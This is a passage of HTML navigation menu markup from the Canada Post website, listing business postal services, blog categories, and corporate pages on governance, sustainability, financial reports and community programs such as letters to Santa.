          <h3 class="submenu-header">Money services and prepaid cards<span class="open-new-window"></span></h3>
          <p>Learn about worldwide money transfers and buying secure, prepaid cards.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="//cpc/en/business/postal-services/money-prepaid-cards/money-orders.page?" class="" target="" alt="">Money orders</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/business/postal-services/money-prepaid-cards/money-orders.page?" target="" alt="">
        <h3 class="submenu-header">Money orders<span class="open-new-window"></span></h3>
        <p>Send certified cashable documents securely through the mail.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/business/postal-services/money-prepaid-cards/credit-cards.page?" class="" target="" alt="">Prepaid credit cards</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/business/postal-services/money-prepaid-cards/credit-cards.page?" target="" alt="">
        <h3 class="submenu-header">Prepaid credit cards<span class="open-new-window"></span></h3>
        <p>Buy prepaid cards at the post office for shopping and travel.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/business/postal-services/money-prepaid-cards/mobile-top-ups-prepaid-products.page?" class="" target="" alt="">Gift cards and prepaid products</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/business/postal-services/money-prepaid-cards/mobile-top-ups-prepaid-products.page?" target="" alt="">
        <h3 class="submenu-header">Gift cards and prepaid products<span class="open-new-window"></span></h3>
        <p>Buy gift cards and phone vouchers at the post office. </p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//information/app/fpo/personal/findpostoffice" class="menu-title " target="" alt="">Find a post office</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="//information/app/fpo/personal/findpostoffice" target="" alt="">
          <h3 class="submenu-header">Find a post office<span class="open-new-window"></span></h3>
          <p></p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//cpc/en/business/postal-services/rent-postal-box.page?" class="menu-title " target="" alt="">Rent a post office box</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/business/postal-services/rent-postal-box.page?" target="" alt="">
          <h3 class="submenu-header">Rent a post office box<span class="open-new-window"></span></h3>
          <p>Get your business mail delivered to a secure Postal Box.</p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//cpc/en/business/postal-services/digital-mail.page?" class="menu-title parent-link" target="" alt="">Digital mail and document sharing</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/business/postal-services/digital-mail.page?" target="" alt="">
          <h3 class="submenu-header">Digital mail and document sharing<span class="open-new-window"></span></h3>
          <p>Send pay statements and tax forms or large files to employees securely.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="//cpc/en/business/postal-services/digital-mail/epost-connect.page?" class="" target="" alt="">Share confidential files digitally (Connect)</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/business/postal-services/digital-mail/epost-connect.page?" target="" alt="">
        <h3 class="submenu-header">Share confidential files digitally (Connect)<span class="open-new-window"></span></h3>
        <p>Securely send messages and documents outside your corporate firewall.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/business/postal-services/digital-mail/epost.page?" class="" target="" alt="">Send digital mail securely</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/business/postal-services/digital-mail/epost.page?" target="" alt="">
        <h3 class="submenu-header">Send digital mail securely<span class="open-new-window"></span></h3>
        <p>Send customers and employees bills and statements to a secure inbox.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//cpc/en/business/postal-services/digital-proof-identity.page?" class="menu-title " target="" alt="">Verify customer identity</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/business/postal-services/digital-proof-identity.page?" target="" alt="">
          <h3 class="submenu-header">Verify customer identity<span class="open-new-window"></span></h3>
          <p>Setup Digital Proof of Identity to protect against fraud and theft.</p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//cpc/en/business/postal-services/stamps-meters.page?" class="menu-title " target="" alt="">Purchase stamps and meters</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/business/postal-services/stamps-meters.page?" target="" alt="">
          <h3 class="submenu-header">Purchase stamps and meters<span class="open-new-window"></span></h3>
          <p>Choose your postage and save on frequent or large business mailing.</p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//store-boutique/en/home" class="menu-title " target="" alt="">Shop</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="//store-boutique/en/home" target="" alt="">
          <h3 class="submenu-header">Shop<span class="open-new-window"></span></h3>
          <p>Shop for stamps, shipping supplies and collectibles.</p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//cpc/en/business/postal-services/order-parcel-locker.page?" class="menu-title " target="" alt="">Request a parcel locker</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/business/postal-services/order-parcel-locker.page?" target="" alt="">
          <h3 class="submenu-header">Request a parcel locker<span class="open-new-window"></span></h3>
          <p>Get a free parcel locker installed in your building for residents.  </p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//cpc/en/business/postal-services/commercial-invoices.page?" class="menu-title " target="" alt="">Billing and Invoices</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/business/postal-services/commercial-invoices.page?" target="" alt="">
          <h3 class="submenu-header">Billing and Invoices<span class="open-new-window"></span></h3>
          <p>Learn how to build customized invoices for your business.</p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
              </ul>
            </div>
          </li>
    
          <li>
            <a href="//blogs/business/" class="parent-link" target="_blank" alt="Opens in new tab">Articles and resources</a>
            <div class="menu-item-level level1" data-level="2">
              <div class="menu-overview">
              <a class="parent-title" href="//blogs/business/" target="_blank" alt="Opens in new tab">
              <h3 class="submenu-header">Articles and resources<span class="open-new-window"></span></h3>
                <p>Access articles with ideas and tips to support your business operations.</p>
              </a>
              </div> 
              <ul>
                
          <li>
            <a href="//blogs/business/category/shipping/" class="menu-title parent-link" target="_blank" alt="Opens in new tab">All posts in shipping</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="//blogs/business/category/shipping/" target="_blank" alt="Opens in new tab">
          <h3 class="submenu-header">All posts in shipping<span class="open-new-window"></span></h3>
          <p></p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="//blogs/business/category/shipping/shipping-insights" class="" target="_blank" alt="Opens in new tab">Shipping articles</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//blogs/business/category/shipping/shipping-insights" target="_blank" alt="Opens in new tab">
        <h3 class="submenu-header">Shipping articles<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//blogs/business/category/shipping/shipping-resources/" class="" target="_blank" alt="Opens in new tab">Shipping resources</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//blogs/business/category/shipping/shipping-resources/" target="_blank" alt="Opens in new tab">
        <h3 class="submenu-header">Shipping resources<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/business/marketing/events/featured.page?" class="" target="" alt="">Shipping events</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/business/marketing/events/featured.page?" target="" alt="">
        <h3 class="submenu-header">Shipping events<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//blogs/business/category/marketing/" class="menu-title parent-link" target="_blank" alt="Opens in new tab">All posts in marketing</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="//blogs/business/category/marketing/" target="_blank" alt="Opens in new tab">
          <h3 class="submenu-header">All posts in marketing<span class="open-new-window"></span></h3>
          <p></p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="//blogs/business/category/marketing/marketing-insights" class="" target="_blank" alt="Opens in new tab">Marketing articles</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//blogs/business/category/marketing/marketing-insights" target="_blank" alt="Opens in new tab">
        <h3 class="submenu-header">Marketing articles<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//blogs/business/category/marketing/marketing-resources" class="" target="_blank" alt="Opens in new tab">Marketing resources</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//blogs/business/category/marketing/marketing-resources" target="_blank" alt="Opens in new tab">
        <h3 class="submenu-header">Marketing resources<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/business/marketing/events/marketing.page?" class="" target="" alt="">Marketing events</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/business/marketing/events/marketing.page?" target="" alt="">
        <h3 class="submenu-header">Marketing events<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//blogs/business/category/ecommerce/" class="menu-title parent-link" target="_blank" alt="Opens in new tab">All posts in e-commerce</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="//blogs/business/category/ecommerce/" target="_blank" alt="Opens in new tab">
          <h3 class="submenu-header">All posts in e-commerce<span class="open-new-window"></span></h3>
          <p></p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="//blogs/business/category/ecommerce/ecommerce-insights" class="" target="_blank" alt="Opens in new tab">E-commerce articles</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//blogs/business/category/ecommerce/ecommerce-insights" target="_blank" alt="Opens in new tab">
        <h3 class="submenu-header">E-commerce articles<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//blogs/business/category/ecommerce/ecommerce-resources" class="" target="_blank" alt="Opens in new tab">E-commerce resources</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//blogs/business/category/ecommerce/ecommerce-resources" target="_blank" alt="Opens in new tab">
        <h3 class="submenu-header">E-commerce resources<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/business/marketing/events/ecommerce.page?" class="" target="" alt="">E-commerce events</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/business/marketing/events/ecommerce.page?" target="" alt="">
        <h3 class="submenu-header">E-commerce events<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
              </ul>
            </div>
          </li>
    
       
        </ul>
        <ul id="mobile-nav-section-our-company" class="menu-primary-links" data-sitemap="our-company">
           
      <div class="menu-overview">
      <a class="parent-title" href="//cpc/en/our-company.page?" target="">
      <h3 class="submenu-header">Our Company<span class="open-new-window"></span></h3>
      <p>Learn about Canada Post and shipping service alerts.</p>
      </a>
      </div> 
      
          <li>
            <a href="//cpc/en/our-company/about-us.page?" class="parent-link" target="" alt="">About us</a>
            <div class="menu-item-level level1" data-level="2">
              <div class="menu-overview">
              <a class="parent-title" href="//cpc/en/our-company/about-us.page?" target="" alt="">
              <h3 class="submenu-header">About us<span class="open-new-window"></span></h3>
                <p>Learn about our management team and corporate initiatives.</p>
              </a>
              </div> 
              <ul>
                
          <li>
            <a href="//cpc/en/our-company/about-us/our-leadership.page?" class="menu-title parent-link" target="" alt="">Our leadership</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/our-company/about-us/our-leadership.page?" target="" alt="">
          <h3 class="submenu-header">Our leadership<span class="open-new-window"></span></h3>
          <p>Learn about our leadership behaviours and teams.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="//cpc/en/our-company/about-us/our-leadership/senior-management-team.page?" class="" target="" alt="">Senior management team</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/our-company/about-us/our-leadership/senior-management-team.page?" target="" alt="">
        <h3 class="submenu-header">Senior management team<span class="open-new-window"></span></h3>
        <p>Learn about the members of our senior management team.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/our-company/about-us/our-leadership/corporate-governance.page?" class="parent-link" target="" alt="">Corporate governance</a>
      <div class="menu-item-level level4" data-level="4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/our-company/about-us/our-leadership/corporate-governance.page?" target="" alt="">
        <h3 class="submenu-header">Corporate governance<span class="open-new-window"></span></h3>
        <p>Learn about the Board of Directors, our principles and policies.</p>
        </a>
        </div> 
        <ul>
          
          <li>
          <a href="//cpc/en/our-company/about-us/our-leadership/corporate-governance/role-of-the-board.page?" class="" target="" alt="">Role of the Board</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/our-company/about-us/our-leadership/corporate-governance/role-of-the-board.page?" target="" alt="">
            <h3 class="submenu-header">Role of the Board<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="//cpc/en/our-company/about-us/our-leadership/corporate-governance/directors-biographies.page?" class="" target="" alt="">Directors' biographies</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/our-company/about-us/our-leadership/corporate-governance/directors-biographies.page?" target="" alt="">
            <h3 class="submenu-header">Directors' biographies<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="//cpc/en/our-company/about-us/our-leadership/corporate-governance/directors-committees.page?" class="" target="" alt="">Directors' committees</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/our-company/about-us/our-leadership/corporate-governance/directors-committees.page?" target="" alt="">
            <h3 class="submenu-header">Directors' committees<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="//cpc/en/our-company/about-us/our-leadership/corporate-governance/diversity-on-our-board.page?" class="" target="" alt="">Board diversity</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/our-company/about-us/our-leadership/corporate-governance/diversity-on-our-board.page?" target="" alt="">
            <h3 class="submenu-header">Board diversity<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/our-company/about-us/our-leadership/travel-and-hospitality-policy.page?" class="parent-link" target="" alt="">Travel and hospitality policy</a>
      <div class="menu-item-level level4" data-level="4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/our-company/about-us/our-leadership/travel-and-hospitality-policy.page?" target="" alt="">
        <h3 class="submenu-header">Travel and hospitality policy<span class="open-new-window"></span></h3>
        <p>Learn about the Board and senior management members spending policy.</p>
        </a>
        </div> 
        <ul>
          
          <li>
          <a href="//cpc/en/our-company/about-us/our-leadership/travel-and-hospitality-policy/travel-and-hospitality-expenses.page?" class="" target="" alt="">Travel and hospitality expenses</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/our-company/about-us/our-leadership/travel-and-hospitality-policy/travel-and-hospitality-expenses.page?" target="" alt="">
            <h3 class="submenu-header">Travel and hospitality expenses<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//cpc/en/our-company/about-us/corporate-sustainability.page?" class="menu-title parent-link" target="" alt="">Corporate sustainability</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/our-company/about-us/corporate-sustainability.page?" target="" alt="">
          <h3 class="submenu-header">Corporate sustainability<span class="open-new-window"></span></h3>
          <p>Learn about how we support communities, employees and the environment.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="//cpc/en/our-company/about-us/corporate-sustainability/environment-responsibility.page?" class="" target="" alt="">Environmental responsibility</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/our-company/about-us/corporate-sustainability/environment-responsibility.page?" target="" alt="">
        <h3 class="submenu-header">Environmental responsibility<span class="open-new-window"></span></h3>
        <p>Learn about our sustainability and conservation efforts.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/our-company/about-us/corporate-responsibility/accessibility.page?" class="parent-link" target="" alt="">Accessibility</a>
      <div class="menu-item-level level4" data-level="4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/our-company/about-us/corporate-responsibility/accessibility.page?" target="" alt="">
        <h3 class="submenu-header">Accessibility<span class="open-new-window"></span></h3>
        <p>Learn about how we’re improving the accessibility of our services.</p>
        </a>
        </div> 
        <ul>
          
          <li>
          <a href="//cpc/en/our-company/about-us/corporate-responsibility/accessibility/digital-accessibility.page?" class="" target="" alt="">Digital accessibility</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/our-company/about-us/corporate-responsibility/accessibility/digital-accessibility.page?" target="" alt="">
            <h3 class="submenu-header">Digital accessibility<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="//cpc/en/our-company/about-us/corporate-responsibility/accessibility/delivery-accommodation-program.page?" class="" target="" alt="">Delivery accommodation program</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/our-company/about-us/corporate-responsibility/accessibility/delivery-accommodation-program.page?" target="" alt="">
            <h3 class="submenu-header">Delivery accommodation program<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="//cpc/en/our-company/about-us/corporate-responsibility/accessibility/advisory-panel.page?" class="" target="" alt="">Accessibility advisory panel</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/our-company/about-us/corporate-responsibility/accessibility/advisory-panel.page?" target="" alt="">
            <h3 class="submenu-header">Accessibility advisory panel<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/our-company/about-us/corporate-responsibility/archived-corporate-reports.page?" class="" target="" alt="">Archived corporate reports</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/our-company/about-us/corporate-responsibility/archived-corporate-reports.page?" target="" alt="">
        <h3 class="submenu-header">Archived corporate reports<span class="open-new-window"></span></h3>
        <p>Access past corporate responsibility reports.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/our-company/about-us/corporate-sustainability/indigenous-reconciliation.page?" class="" target="" alt="">Indigenous and Northern reconciliation</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/our-company/about-us/corporate-sustainability/indigenous-reconciliation.page?" target="" alt="">
        <h3 class="submenu-header">Indigenous and Northern reconciliation<span class="open-new-window"></span></h3>
        <p>Learn about how we’re improving our work with Indigenous communities.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//cpc/en/our-company/about-us/transparency-and-trust.page?" class="menu-title parent-link" target="" alt="">Transparency and trust</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/our-company/about-us/transparency-and-trust.page?" target="" alt="">
          <h3 class="submenu-header">Transparency and trust<span class="open-new-window"></span></h3>
          <p>Learn about how we protect your information and keep you informed. </p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="//cpc/en/our-company/about-us/transparency-and-trust/privacy-centre.page?" class="" target="" alt="">Privacy centre</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/our-company/about-us/transparency-and-trust/privacy-centre.page?" target="" alt="">
        <h3 class="submenu-header">Privacy centre<span class="open-new-window"></span></h3>
        <p>Learn about our privacy practices and access the Privacy Policy.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/our-company/about-us/transparency-and-trust/access-to-information.page?" class="" target="" alt="">Access to information</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/our-company/about-us/transparency-and-trust/access-to-information.page?" target="" alt="">
        <h3 class="submenu-header">Access to information<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//cpc/en/our-company/about-us/legislation-and-regulations.page?" class="menu-title " target="" alt="">Legislation and regulations</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/our-company/about-us/legislation-and-regulations.page?" target="" alt="">
          <h3 class="submenu-header">Legislation and regulations<span class="open-new-window"></span></h3>
          <p>Access the Canada Post Corporation Act.</p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//cpc/en/our-company/about-us/financial-reports.page?" class="menu-title parent-link" target="" alt="">Financial reports</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/our-company/about-us/financial-reports.page?" target="" alt="">
          <h3 class="submenu-header">Financial reports<span class="open-new-window"></span></h3>
          <p>View our annual reports and quarterly financial reports.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="//cpc/en/our-company/about-us/financial-reports/quarterly-financial-reports.page?" class="" target="" alt="">Quarterly financial reports</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/our-company/about-us/financial-reports/quarterly-financial-reports.page?" target="" alt="">
        <h3 class="submenu-header">Quarterly financial reports<span class="open-new-window"></span></h3>
        <p>Access current and archived quarterly financial reports.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/our-company/about-us/financial-reports/2020-annual-report/an-unprecedented-year.page?" class="" target="" alt="">2020 Annual report</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/our-company/about-us/financial-reports/2020-annual-report/an-unprecedented-year.page?" target="" alt="">
        <h3 class="submenu-header">2020 Annual report<span class="open-new-window"></span></h3>
        <p>Access the most recent Annual report.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
              </ul>
            </div>
          </li>
    
          <li>
            <a href="//cpc/en/our-company/giving-back-to-our-communities.page?" class="parent-link" target="" alt="">Giving back to our communities</a>
            <div class="menu-item-level level1" data-level="2">
              <div class="menu-overview">
              <a class="parent-title" href="//cpc/en/our-company/giving-back-to-our-communities.page?" target="" alt="">
              <h3 class="submenu-header">Giving back to our communities<span class="open-new-window"></span></h3>
                <p>Learn about grants, awards and access children’s activities.</p>
              </a>
              </div> 
              <ul>
                
          <li>
            <a href="//cpc/en/our-company/giving-back-to-our-communities/canada-post-community-foundation.page?" class="menu-title parent-link" target="" alt="">Canada Post Community Foundation</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/our-company/giving-back-to-our-communities/canada-post-community-foundation.page?" target="" alt="">
          <h3 class="submenu-header">Canada Post Community Foundation<span class="open-new-window"></span></h3>
          <p>Learn about Foundation grants for schools, charities and organizations.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="//cpc/en/our-company/giving-back-to-our-communities/canada-post-community-foundation/community-foundation-application.page?" class="" target="" alt="">Community Foundation application</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/our-company/giving-back-to-our-communities/canada-post-community-foundation/community-foundation-application.page?" target="" alt="">
        <h3 class="submenu-header">Community Foundation application<span class="open-new-window"></span></h3>
        <p>Learn how to apply for a Community Foundation grant.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/our-company/giving-back-to-our-communities/canada-post-community-foundation/community-foundation-trustees.page?" class="" target="" alt="">Community Foundation trustees</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/our-company/giving-back-to-our-communities/canada-post-community-foundation/community-foundation-trustees.page?" target="" alt="">
        <h3 class="submenu-header">Community Foundation trustees<span class="open-new-window"></span></h3>
        <p>Learn about the trustees and advisors that award Foundation grants.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/our-company/giving-back-to-our-communities/canada-post-community-foundation/community-foundation-grant-recipients.page?" class="" target="" alt="">Community Foundation grant recipients</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/our-company/giving-back-to-our-communities/canada-post-community-foundation/community-foundation-grant-recipients.page?" target="" alt="">
        <h3 class="submenu-header">Community Foundation grant recipients<span class="open-new-window"></span></h3>
        <p>Browse past community projects that have received grants.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//cpc/en/our-company/giving-back-to-our-communities/canada-post-awards-for-indigenous-students.page?" class="menu-title parent-link" target="" alt="">Canada Post Awards for Indigenous Students </a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/our-company/giving-back-to-our-communities/canada-post-awards-for-indigenous-students.page?" target="" alt="">
          <h3 class="submenu-header">Canada Post Awards for Indigenous Students <span class="open-new-window"></span></h3>
          <p>Learn about education grants for Indigenous Peoples.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="//cpc/en/our-company/giving-back-to-our-communities/canada-post-awards-for-indigenous-students/education-award-recipients.page?" class="" target="" alt="">Education award recipients</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/our-company/giving-back-to-our-communities/canada-post-awards-for-indigenous-students/education-award-recipients.page?" target="" alt="">
        <h3 class="submenu-header">Education award recipients<span class="open-new-window"></span></h3>
        <p>Browse a list of past Indigenous Student award winners.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//cpc/en/our-company/giving-back-to-our-communities/write-a-letter-to-santa.page?" class="menu-title parent-link" target="" alt="">Write a letter to Santa</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/our-company/giving-back-to-our-communities/write-a-letter-to-santa.page?" target="" alt="">
          <h3 class="submenu-header">Write a letter to Santa<span class="open-new-window"></span></h3>
          <p>Send a letter to the North Pole and get tips for parents and teachers.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="//cpc/en/our-company/giving-back-to-our-communities/write-a-letter-to-santa/santa-program-for-parents.page?" class="" target="" alt="">Santa letter tips for parents</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/our-company/giving-back-to-our-communities/write-a-letter-to-santa/santa-program-for-parents.page?" target="" alt="">
        <h3 class="submenu-header">Santa letter tips for parents<span class="open-new-window"></span></h3>
        <p>Get letter templates and tips for writing to the North Pole.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/our-company/giving-back-to-our-communities/write-a-letter-to-santa/santa-program-for-teachers.page?" class="" target="" alt="">Santa letter tips for teachers</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/our-company/giving-back-to-our-communities/write-a-letter-to-santa/santa-program-for-teachers.page?" target="" alt="">
        <h3 class="submenu-header">Santa letter tips for teachers<span class="open-new-window"></span></h3>
        <p>Get information on sending a class letter to Santa.</p>
        </a>
        </div> 
